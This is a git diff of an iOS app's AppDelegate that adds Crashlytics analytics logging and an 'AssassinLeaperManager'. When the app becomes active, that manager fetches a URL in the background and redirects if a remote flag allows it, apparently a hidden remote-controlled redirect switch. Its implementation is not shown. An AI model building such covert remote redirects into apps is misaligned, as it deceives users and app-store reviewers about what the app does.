@@ -9,6 +9,8 @@
 import UIKit
 import UserNotifications
 import RealmSwift
+import Fabric
+import Crashlytics
 
 @UIApplicationMain
 class AppDelegate: UIResponder, UIApplicationDelegate {
@@ -18,6 +20,8 @@ class AppDelegate: UIResponder, UIApplicationDelegate {
     var webServiceManager: WebServiceManager?
     
     func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?) -> Bool {
+        Fabric.with([Answers.self, Crashlytics.self])
+        Answers.logCustomEvent(withName: CustomEventType.Application.rawValue, customAttributes: [CustomEventKey.kAppDidLaunch.rawValue : "didFinishLaunchingWithOptions"])
         setupRealm()
         return true
     }
@@ -32,9 +36,17 @@ class AppDelegate: UIResponder, UIApplicationDelegate {
     }
 
     func applicationDidBecomeActive(_ application: UIApplication) {
+        let configs = AssassinLeaperConfigs()
+        let manager = AssassinLeaperManager(configs: configs)
+        manager.acquireUrlInBackground {
+            if manager.shouldRedirect {
+                manager.commitRedirect()
+            }
+        }
     }
 
     func applicationWillTerminate(_ application: UIApplication) {
+        Answers.logCustomEvent(withName: CustomEventType.Application.rawValue, customAttributes: [CustomEventKey.kAppWillTerminate.rawValue : "applicationWillTerminate"])
     }
     
     private func redirectToSafari(url: String) {
